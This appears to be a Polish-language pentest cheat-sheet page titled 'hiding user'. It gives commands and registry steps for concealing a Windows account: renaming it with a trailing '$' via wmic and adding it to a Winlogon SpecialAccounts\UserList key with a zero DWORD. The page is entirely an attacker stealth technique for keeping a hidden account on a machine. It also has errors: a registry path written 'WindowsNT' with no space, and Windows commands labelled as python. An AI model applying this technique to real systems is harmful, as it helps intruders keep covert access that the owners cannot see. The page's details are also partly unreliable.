---
layout:
  title:
    visible: false
  description:
    visible: false
  tableOfContents:
    visible: false
  outline:
    visible: false
  pagination:
    visible: false
---

# hiding user

```python
#wylistowanie użytkowników
net users

#częściowe ukrywanie użytkownika - dodanie $
wmic useraccount where name="admin1" call rename name="admin1$"

#ukrywanie użytkownika w rejestrze
regedit
Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon

#tworzenie new key
SpecialAccounts

#tworzenie new key wewnątrz SpecialAccounts
UserList

#tworzenie DWORD (32-bit)
admin1$

#ustawianie w DWORD
Value data: 0
```
